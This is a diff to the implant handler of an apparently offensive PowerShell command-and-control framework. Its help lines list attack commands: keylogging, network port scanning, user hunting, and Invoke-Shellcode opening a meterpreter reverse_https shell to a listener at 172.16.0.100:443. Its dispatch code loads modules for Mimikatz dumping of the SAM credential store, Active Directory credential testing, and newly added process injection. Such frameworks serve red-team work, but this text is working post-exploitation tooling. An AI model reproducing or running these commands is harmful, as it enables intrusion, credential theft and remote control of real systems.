@@ -202,6 +202,7 @@ function Implant-Handler
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
+        #write-host " Invoke-PSInject -ProcID 4444 -PoshCode 'iex get-process'" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
@@ -653,9 +654,13 @@ $error.clear()
                 CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                 $pscommand = "Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)"
             }
+            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
+            { 
+                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+            }
             if ($pscommand.ToLower().StartsWith('test-adcredential'))
             { 
-                CheckModuleLoaded "Brute-ad.ps1" $psrandomuri
+                CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
             { 
